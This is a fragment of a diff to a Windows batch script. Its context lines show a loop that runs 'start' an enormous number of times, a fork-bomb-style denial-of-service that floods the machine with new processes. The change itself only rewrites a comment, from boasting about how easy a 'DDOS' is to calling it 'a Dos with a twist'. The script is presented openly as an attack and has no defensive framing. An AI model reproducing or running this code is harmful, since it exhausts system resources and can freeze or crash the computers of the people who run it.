@@ -5,4 +5,4 @@ for /l %%i in (1,1,1000000000000000000000000000000000000000000000000000000000000
     start
     
 )
-rem you see how easy it is to make a DDOS
+rem This is more of a Dos with a twist
